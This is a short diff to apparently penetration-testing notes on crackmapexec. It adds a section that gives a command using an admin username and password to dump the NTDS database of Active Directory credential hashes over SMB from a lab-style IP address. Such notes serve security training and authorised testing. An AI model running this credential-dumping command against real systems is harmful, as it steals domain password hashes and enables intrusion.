@@ -87,3 +87,11 @@ optional arguments:
                         password(s) or file(s) containing passwords
   -k, --kerberos        Use Kerberos authentication from ccache file (KRB5CCNAME)
 ```
+
+## Extract NTDS from SMB
+
+Using an account with admin privileges:
+
+```shell-session
+crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
+```
